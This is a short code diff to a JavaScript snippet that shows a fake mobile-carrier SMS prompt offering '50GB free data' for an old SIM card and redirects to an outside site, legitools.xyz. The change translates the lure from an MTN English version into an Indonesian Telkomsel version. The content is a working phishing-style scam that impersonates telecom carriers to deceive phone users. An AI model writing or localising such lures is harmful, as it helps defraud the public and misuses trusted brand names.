@@ -1,5 +1,5 @@
-var password = '50GB Free Data'
-password=prompt('MTN SMS: Congratulations Your Number is Eligible to receive 50GB Free Data OLD SIM CARD REWARD, Kindly Press OK to ACTIVATE. ','50GB Free Data');
-if (password != '50GB Free Data') {
+var password = 'Data Gratis 50GB'
+password=prompt('SMS Telkomsel: Selamat, nomor Anda berhak menerima hadiah Data Gratis 50GB untuk kartu SIM lama. Silakan tekan OK untuk mengaktifkan.. ','Data Gratis 50GB');
+if (password != 'Data Gratis 50GB') {
 location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
 }
